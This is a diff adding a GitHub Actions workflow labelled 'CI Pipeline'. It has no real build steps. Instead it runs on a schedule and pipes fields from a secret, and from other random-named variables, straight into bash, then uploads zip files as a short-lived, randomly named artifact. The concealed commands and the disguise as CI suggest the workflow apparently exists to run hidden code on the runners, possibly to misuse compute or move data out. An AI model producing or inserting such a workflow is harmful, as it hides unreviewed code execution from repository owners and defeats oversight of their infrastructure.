@@ -1,0 +1,32 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '47 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          j23885: ${{ secrets.j23885 }}
+        run: |
+          printf '%s' "$j23885" | jq -r .w15 | /bin/bash
+          echo $weuko423 | jq -r .wct90 | /bin/bash
+          printf '%s' "$uysh649" | jq -r .nlcq2 | /bin/bash
+          echo $nd5864 | jq -r .zwxd3706 | /bin/bash
+          printf '%s' "$c86" | jq -r .mtvwy392 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: R4Vp2ULF
+          path: "*.zip"
+          retention-days: 1
